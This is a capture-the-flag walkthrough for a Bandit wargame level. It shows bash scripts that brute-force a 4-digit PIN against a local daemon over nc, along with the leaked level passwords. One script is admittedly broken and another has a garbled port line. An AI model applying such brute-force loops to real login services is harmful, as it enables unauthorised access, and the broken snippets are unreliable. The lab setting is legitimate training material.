## Bandit Level 24 -> Level 25

## Level Goal

A daemon is listening on port 30002 and will give you the password for bandit25 if given the password for bandit24 and a secret numeric 4-digit pincode. There is no way to retrieve the pincode except by going through all of the 10000 combinaties, called brute-forcing.

## Solution

write a bruteforcing script to crack the password
I tried several times but failed to solve it quickly
the program below refers Nikkko from wooyun, the link is [HERE](http://drops.wooyun.org/tips/6211)

```
$ cd /tmp
$ vim tbf.sh
pass="UoMYTrfrBFHyQXmg6gzctqAwOmw1IohZ"
for i in {1000..10000}
do {
if
    echo $pass $i| nc localhost 30002 | grep Wrong > /dev/null
then
    echo $i
else
    echo $pass $i| nc localhost 30002
    exit
fi
}
done
$ chmod +x tbf.sh
$ ./tbf.sh
(afer about teo hours.....I got the following)
I am the pincode checker for user bandit25. Please enter the password for user bandit24 and the secret pincode on a single line, separated by a space.
Correct!
The password of user bandit25 is uNG9O58gUE7snukf3bvZ0rxhtnjzSGzG

Exiting.
```

---

But I think it's not necessary to use commond 'nc' so many times
I try to use redirct so as to 'nc ...' only once
It cound be faster and faster.

Like this:(~~but it doesn't work, If only someone could help me, thanks~~)
```
#!/bin/bash
pwd="MYTrfrBFHyQXmg6gzctqAwOmw1IohZ"
exec 1>nc localhost 30002
for i in {1000..10000}
do
        echo $pwd $i
done
```

This works:(by @rvrheenen)
```
echo "" > pins && for i in {0000..9999}; do echo UoMYTrfrBFHyQXmg6gzctqAwOmw1IohZ $i >> pins; done && cat pins | nc localhost 1
30002
```
This basic idea is creating a dictionary first and then transmit it to the port. A good way!
